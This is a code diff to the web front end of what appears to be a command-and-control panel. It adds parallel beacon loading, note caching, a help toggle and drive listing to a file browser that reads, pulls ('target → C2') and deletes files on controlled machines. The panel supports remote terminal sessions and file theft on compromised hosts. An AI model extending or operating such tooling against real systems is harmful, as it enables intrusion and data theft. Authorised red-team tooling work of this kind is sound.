@@ -185,7 +185,13 @@ async function selB(uuid) {
     const be = b ? b.find(x => x.uuid === uuid) : null;
     const nm = be ? es(be.nickname || be.hostname || '') : '';
     document.getElementById('th-n').textContent = nm || uuid.substring(0, 8);
-    const th = await ApiClient.get('terminal', { beacon_uuid: uuid });
+    document.getElementById('nt-in').value = (be && be.notes) || '';
+    const [th] = await Promise.all([
+        ApiClient.get('terminal', { beacon_uuid: uuid }),
+        loadInfo(uuid),
+        loadBF(uuid),
+        loadBM(uuid)
+    ]);
     if (th && th.length) {
         TRMS[uuid] = th.map(e => ({ v: e.command + '\n' + (e.output || ''), t: 'w' }));
         rT(uuid);
@@ -193,10 +199,6 @@ async function selB(uuid) {
         if (TRMS[uuid] && TRMS[uuid].length) rT(uuid);
         else { tA(uuid, 's', 'Terminal for ' + (nm || uuid)); rT(uuid); }
     }
-    await loadInfo(uuid);
-    await loadBF(uuid);
-    await loadBM(uuid);
-    if (be && be.notes) document.getElementById('nt-in').value = be.notes;
     loadPersons();
 }
 
@@ -287,6 +289,8 @@ async function saveNotes() {
     if (!SEL) return;
     const r = await ApiClient.post('savenotes', { uuid: SEL, text });
     if (r && r.status === 'ok') {
+        const be = _beaconCache ? _beaconCache.find(x => x.uuid === SEL) : null;
+        if (be) be.notes = text;
         document.getElementById('nt-st').textContent = 'Saved at ' + new Date().toLocaleTimeString();
         setTimeout(() => document.getElementById('nt-st').textContent = '', 2000);
     } else { tm('Failed to save notes', 1); }
@@ -295,6 +299,13 @@ async function saveNotes() {
 let _fmTimer = null;
 // Persistent selection across FM re-renders/navigation: path -> filename
 let fmSelected = new Map();
+
+function helpToggle() {
+    const card = document.getElementById('help-card');
+    if (!card) return;
+    card.style.display = card.style.display === 'none' ? 'block' : 'none';
+    if (card.style.display === 'block') card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
 
 function fmToggle() {
     const card = document.getElementById('fm-card');
@@ -433,34 +444,42 @@ function fmRender(entries, path) {
         const parent = path.split('/').slice(0, -1).join('/') || '/';
         html += '<tr><td></td><td class="fn" onclick="fmNav(\'' + es(parent) + '\')"><span style="color:var(--amber)">&#8617; ..</span></td><td></td><td></td><td></td><td></td></tr>';
     }
+    const drives = entries.filter(e => e.type === 'drive');
     const dirs = entries.filter(e => e.type === 'dir').sort((a, b) => a.name.localeCompare(b.name));
-    const files = entries.filter(e => e.type !== 'dir').sort((a, b) => a.name.localeCompare(b.name));
-    for (const e of [...dirs, ...files]) {
-        const fullPath = (path === '/' ? '' : path) + '/' + e.name;
-        const sz = e.type === 'dir' ? '--' : (e.size > 1048576 ? (e.size / 1048576).toFixed(1) + 'M' : e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size + 'B');
+    const files = entries.filter(e => e.type !== 'dir' && e.type !== 'drive').sort((a, b) => a.name.localeCompare(b.name));
+    for (const e of [...drives, ...dirs, ...files]) {
+        const fullPath = e.type === 'drive' ? '/' + e.name : (path === '/' ? '' : path) + '/' + e.name;
+        let sz;
+        if (e.type === 'drive') {
+            sz = e.size > 1073741824 ? (e.size / 1073741824).toFixed(0) + 'G' : e.size > 1048576 ? (e.size / 1048576).toFixed(0) + 'M' : '--';
+        } else {
+            sz = e.type === 'dir' ? '--' : (e.size > 1048576 ? (e.size / 1048576).toFixed(1) + 'M' : e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size + 'B');
+        }
         const mod = e.modified ? e.modified.substring(0, 16).replace('T', ' ') : '--';
-        const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
+        const icon = e.type === 'drive' ? '&#128190;' : e.type === 'dir' ? '&#128193;' : '&#128196;';
         html += '<tr>';
         if (e.type === 'file') {
             html += '<td onclick="event.stopPropagation()"><input type="checkbox" class="fm-sel" value="' + es(fullPath) + '" data-name="' + es(e.name) + '"' + (fmSelected.has(fullPath) ? ' checked' : '') + '></td>';
         } else {
             html += '<td></td>';
         }
-        if (e.type === 'dir') {
-            html += '<td class="fn" onclick="fmNav(\'' + es(fullPath) + '\')">' + icon + ' ' + es(e.name) + '</td>';
+        if (e.type === 'dir' || e.type === 'drive') {
+            html += '<td class="fn" onclick="fmNav(\'' + es(fullPath) + '\')">' + icon + ' ' + es(e.name) + (e.drive_type ? ' <span style="font-size:9px;color:var(--text2)">(' + es(e.drive_type) + ')</span>' : '') + '</td>';
         } else {
             html += '<td class="fn" onclick="fmReadFile(\'' + es(fullPath) + '\')" title="Click to preview">&#128196; ' + es(e.name) + '</td>';
         }
         html += '<td>' + sz + '</td>';
-        html += '<td>' + es(e.type) + '</td>';
+        html += '<td>' + es(e.drive_type || e.type) + '</td>';
         html += '<td style="font-size:10px;color:var(--text2)">' + mod + '</td>';
         html += '<td class="act">';
         if (e.type === 'file') {
             html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();fmReadFile(\'' + es(fullPath) + '\')">Read</button>';
             html += '<button class="btn btn-xs btn-b" title="Transfer target &#8594; C2" onclick="event.stopPropagation();fmPullFile(\'' + es(fullPath) + '\',\'' + es(e.name) + '\')">&#11015; Get</button>';
         }
-        html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmProp(\'' + es(fullPath) + '\',\'' + es(e.type) + '\',' + (e.size || 0) + ',\'' + es(e.perms || '') + '\',\'' + es(e.modified || '') + '\')">Info</button>';
-        html += '<button class="btn btn-xs btn-r" onclick="event.stopPropagation();if(confirm(\'Delete ' + es(e.name) + '?\'))fmDelete(\'' + es(fullPath) + '\')">Del</button>';
+        if (e.type !== 'drive') {
+            html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();fmProp(\'' + es(fullPath) + '\',\'' + es(e.type) + '\',' + (e.size || 0) + ',\'' + es(e.perms || '') + '\',\'' + es(e.modified || '') + '\')">Info</button>';
+            html += '<button class="btn btn-xs btn-r" onclick="event.stopPropagation();if(confirm(\'Delete ' + es(e.name) + '?\'))fmDelete(\'' + es(fullPath) + '\')">Del</button>';
+        }
         html += '</td></tr>';
     }
     html += '</tbody></table>';
